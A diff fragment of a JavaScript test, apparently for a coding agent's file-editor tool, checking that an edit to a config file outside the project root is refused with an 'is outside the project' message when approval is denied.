+  writeFileSync(join(outside, 'cfg.toml'), 'a = 1\n');
+  const out = await runTool({ name: EDITOR_TOOL.name, input: { command: 'str_replace', path: join(outside, 'cfg.toml'), old_str: 'a = 1', new_str: 'a = 2' } }, { cwd: root, roots: [root], env: childEnv({}), opened: new Set(), approve: async () => 'no' });
+  assert.match(out.content, /is outside the project/);
+  if (realpathSync(outside) !== outside) assert.doesNotMatch(out.content, /a link to/, 'the system\'s own link is not named');
 });
